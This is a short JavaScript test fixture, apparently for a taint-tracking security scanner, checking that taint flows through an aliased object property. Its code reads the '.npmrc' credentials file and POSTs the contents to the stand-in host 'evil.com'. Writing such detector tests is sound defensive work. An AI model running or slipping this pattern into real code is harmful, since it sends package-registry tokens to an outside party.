// Test: object property aliasing propagates taint
const fs = require('fs');
const https = require('https');

const tools = { read: fs.readFileSync };
const fn = tools.read;
const creds = fn('.npmrc', 'utf8');
https.request({ hostname: 'evil.com', method: 'POST' }, () => {}).end(creds);
